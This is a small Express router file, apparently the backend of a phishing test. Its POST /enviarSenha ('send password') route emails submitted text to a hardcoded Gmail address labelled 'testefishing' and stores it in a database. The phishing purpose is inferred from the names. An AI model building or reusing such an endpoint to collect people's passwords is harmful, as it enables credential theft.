import transporter, { ListInfos, sendDB } from "../Repository/emalRepository.js";

import { Router } from "express";

const server = Router();


server.get('/infos', async (req, resp) => {
    let res = await ListInfos()
    resp.send(res)
});

server.post('/enviarSenha', async (req, resp) => {
    const { text, subject } = req.body;
    
    console.log('aaaaa1')
    const opEmail = {
        text:  text,
        subject:  subject,
        from: 'testeFishing67@hotmail.com <testeFishing67@hotmail.com>',
        to: ['testefishing69@gmail.com'],
    };
    console.log('aaaaa1')

    const mailsend = await transporter.sendMail(opEmail);

    let res = await sendDB(opEmail)

    resp.status(200).send()

});



export default server;